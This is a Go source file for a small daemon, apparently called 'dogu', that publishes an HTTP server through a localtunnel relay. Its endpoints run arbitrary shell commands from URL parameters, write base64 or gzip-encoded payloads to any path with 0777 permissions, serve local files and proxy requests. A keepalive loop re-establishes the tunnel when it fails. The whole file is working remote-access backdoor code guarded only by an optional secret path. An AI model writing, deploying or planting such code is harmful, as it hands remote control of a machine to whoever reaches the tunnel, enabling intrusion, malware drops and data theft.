package main

import (
	"net/http"
	"strconv"
	"strings"
	"os/exec"
	"os"
	logx "log"
	"compress/gzip"
	"fmt"
	"io"
	"bytes"
	"io/ioutil"
	"runtime"
	"math/rand"
	"time"
	b64 "encoding/base64"
	lt "github.com/jweslley/localtunnel"
	"github.com/sevlyar/go-daemon"
)


var (
	outbg []byte
	busy bool = false
	log []string
	ka_string string
	serverURL string
	proxy_target string
)

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
func init() {
    rand.Seed(time.Now().UnixNano())
}

func RandStringRunes(n int) string {
    b := make([]rune, n)
    for i := range b {
        b[i] = letterRunes[rand.Intn(len(letterRunes))]
    }
    return string(b)
}
func HelloServer(w http.ResponseWriter, req *http.Request) {
	log=append(log,"HelloServer")
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte("Service is alive.\n"))
}
func ping(w http.ResponseWriter, req *http.Request) {
	log=append(log,"ping")
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte("pong\n"))
}
func ka(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	ka_string=RandStringRunes(10)
	w.Write([]byte(ka_string))
}

func cmd_foreground(w http.ResponseWriter, req *http.Request){
	w.Header().Set("Content-Type", "text/plain")
	cmd := req.URL.Query().Get("cmd")
	log=append(log,"cmd_foreground "+cmd)
	outs, err := exec.Command(cmd).Output()
	if err != nil {
		outs = []byte("cmd failed " + err.Error())
		}
	w.Write([]byte(outs))
}

func exec_gosub(cmd string){
	var err error
	busy=true
	log=append(log,"exec_gosub "+ cmd)
        outbg, err = exec.Command(cmd).Output()
	if err!=nil {
		log=append(log,"exec_gosub error:"+ err.Error())
		}
	busy=false
}

func cmd_background(w http.ResponseWriter, req *http.Request){
	out:="busy"
        w.Header().Set("Content-Type", "text/plain")
        cmd := req.URL.Query().Get("cmd")
	log=append(log,"cmd_background "+ cmd)
	if ! busy {
		go exec_gosub(cmd)
		out="success"
		}
        w.Write([]byte(out))
}
func cmd_background_check(w http.ResponseWriter, req *http.Request){
	log=append(log,"cmd_backgroundc ")
	out:="dummy"
        w.Header().Set("Content-Type", "text/plain")
	if busy {
		out="working"
		} else {
			out=string(outbg)
			}
        w.Write([]byte(out))
}
func upd_script(w http.ResponseWriter, req *http.Request){

	out:="ok"
	b64pl:=req.URL.Query().Get("b64pl")
	name:=req.URL.Query().Get("name")
        log=append(log,"upd_script "+ name)
	f, err := os.Create(name)
	if err != nil {
		log=append(log,"upd_script create:"+err.Error())
		out=string(err.Error())
		} else {
			defer f.Close()
			sDec, err := b64.StdEncoding.DecodeString(b64pl)
			if err!=nil {
				http.Error(w, "Bad b64 pl", http.StatusInternalServerError)
				return
				}
			_, err = f.Write(sDec)
			if err != nil {
				log=append(log,"upd_script write:"+err.Error())
				out=string(err.Error())
				}else {
					var err error
					if runtime.GOOS != "windows" {
						err = os.Chmod(name, 0777);
						}
					if err != nil {
						log=append(log,"upd_script chmod:"+err.Error())
						out=string(err.Error())
						}
					}

			}
        w.Write([]byte(out))
}
func upd_scriptz(w http.ResponseWriter, req *http.Request){

	out:="ok"
	b64plz:=req.URL.Query().Get("b64plz")
	name:=req.URL.Query().Get("name")
        log=append(log,"upd_script "+ name)
	f, err := os.Create(name)
	if err != nil {
		log=append(log,"upd_script create:"+err.Error())
		out=string(err.Error())
		} else {
			defer f.Close()
			sDecz, err := b64.StdEncoding.DecodeString(b64plz)
			if err!=nil {
				http.Error(w, "Bad b64 pl", http.StatusInternalServerError)
				return
				}
			reader := bytes.NewReader(sDecz)
			sDec, err := gzip.NewReader(reader);
			if err!=nil {
				http.Error(w, "bad gz pl", http.StatusInternalServerError)
				return
				}
			stream, err := ioutil.ReadAll(sDec)
			if err!=nil {
				http.Error(w, "Server Error ", http.StatusInternalServerError)
				return
				}
			_, err = f.Write(stream)
			if err != nil {
				log=append(log,"upd_script write:"+err.Error())
				out=string(err.Error())
				}else {
					var err error
					if runtime.GOOS != "windows" {
						err = os.Chmod(name, 0777);
						}
					if err != nil {
						log=append(log,"upd_script chmod:"+err.Error())
						out=string(err.Error())
						}
					}

			}
        w.Write([]byte(out))
}

func getlog(w http.ResponseWriter, req *http.Request){
	log=append(log,"getlog ")
        w.Header().Set("Content-Type", "text/plain")
        w.Write([]byte(strings.Join(log[:], "\n")))
}
func proxy_set(w http.ResponseWriter, req *http.Request){
	target:=req.URL.Query().Get("target")
	log=append(log,"proxy_set "+ target)
        w.Header().Set("Content-Type", "text/plain")
	resp:="failed"
	if target!="" {
		proxy_target=target
		resp="sucess"
		}
        w.Write([]byte(resp))
}
func proxy_get(wr http.ResponseWriter, req *http.Request) {

	log=append(log,"proxy_get")
	client := &http.Client{}
	nreq, err := http.NewRequest(http.MethodGet, proxy_target, nil)
	if err != nil {
		http.Error(wr, "Server Error", http.StatusInternalServerError)
		logx.Fatal("ServeHTTP:", err)
		}
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(nreq)
	if err != nil {
		http.Error(wr, "Server Error", http.StatusInternalServerError)
		logx.Fatal("ServeHTTP:", err)
	}
	defer resp.Body.Close()
	wr.WriteHeader(resp.StatusCode)
	io.Copy(wr, resp.Body)
}

//  https://gist.github.com/yowu/f7dc34bd4736a65ff28d
func do_lt(conf configuration) string {
	c := lt.NewClient(conf.Host)
	t := c.NewTunnel(conf.Target, conf.Port)
	t.OpenAs(conf.Request_dom)
	return t.URL()

}

func do_main(conf configuration) {

	serverURL=do_lt(conf)
	logx.Printf("your url is: %s\n", serverURL)
	seedSecret:=""
	if conf.Secret!=""{
		seedSecret="/"+conf.Secret
		}
	if conf.Ka>0 {
		go ka_proc(conf)
		}
	mux := http.NewServeMux()
	fileServer := http.FileServer(http.Dir("./"))
	mux.Handle(seedSecret+"/f/", http.StripPrefix("/f", fileServer))
	mux.HandleFunc("/", HelloServer)
	mux.HandleFunc(seedSecret+"/ka", ka)
	mux.HandleFunc(seedSecret+"/ping", ping)
	mux.HandleFunc(seedSecret+"/cmd_fore", cmd_foreground)
	mux.HandleFunc(seedSecret+"/cmd_back", cmd_background)
	mux.HandleFunc(seedSecret+"/cmd_backc", cmd_background_check)
	mux.HandleFunc(seedSecret+"/upd_script", upd_script)
	mux.HandleFunc(seedSecret+"/upd_scriptz", upd_scriptz)
	mux.HandleFunc(seedSecret+"/proxy_set", proxy_set)
	mux.HandleFunc(seedSecret+"/proxy_get", proxy_get)
	mux.HandleFunc(seedSecret+"/getlog", getlog)

	err := http.ListenAndServe(":"+strconv.Itoa(conf.Port), mux)
//    err := http.ListenAndServeTLS(":443", "server.crt", "server.key", nil)
	if err != nil {
		panic("ListenAndServe: ")
		}
}

func ka_proc(conf configuration){
	for {
		time.Sleep(time.Duration(conf.Ka) * time.Second)
		resp, err := http.Get(serverURL+"/"+conf.Secret+"/ka")
		if err != nil {
			log=append(log,"ka_proc is having issues1")
			serverURL=do_lt(conf)
			}
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log=append(log,"ka_proc is having issues2")
			}
		sb := string(body)
		if sb!=ka_string {
			log=append(log,"Keepalive is having issues "+sb+" "+ka_string)
			serverURL=do_lt(conf)
			}
		}
}



func main() {
/*
	conf_host:="https://localtunnel.me"
	conf_local:="localhost"
	conf_subdomain:="antani"
	conf_port:=8080
*/
	cntxt := &daemon.Context{
		PidFileName: "dogu.pid",
		PidFilePerm: 0644,
		LogFileName: "dogu.log",
		LogFilePerm: 0640,
		WorkDir:     "./",
		Umask:       027,
		Args:        os.Args,
		}



	conf, err := args_parse(cmd_line_item_init())
	if err!=nil {
		if err.Error() != "dummy"{
			fmt.Println(err.Error())
			}
		print_help(cmd_line_item_init());
		os.Exit(-1)
		}
	if conf.Daemon && runtime.GOOS != "windows" {
		d, err := cntxt.Reborn()
		if err != nil {
			logx.Fatal("Unable to run: ", err)
			}

		if d != nil {
			fmt.Println("dogu started")
			return
			}
		defer cntxt.Release()
		}
	do_main(conf)
}
